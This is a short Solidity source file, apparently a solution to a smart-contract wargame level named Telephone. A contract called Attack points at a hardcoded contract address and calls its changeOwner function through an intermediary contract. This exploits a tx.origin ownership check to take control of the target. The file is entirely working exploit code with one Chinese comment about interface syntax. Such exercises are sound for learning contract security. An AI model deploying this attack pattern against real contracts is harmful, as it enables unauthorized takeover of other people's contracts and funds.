// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;



interface Telephone{//这种写法 也ok
     function changeOwner(address _owner) external;
}

contract Attack {

    Telephone tel;
    
    constructor () public {
        tel=Telephone(0x0B52e0a0d93C6A0c3aFc62905cf49dFa213bE738);
    }
  

    function attackGO(address _owner) public {
    
        tel.changeOwner(_owner);
    }
}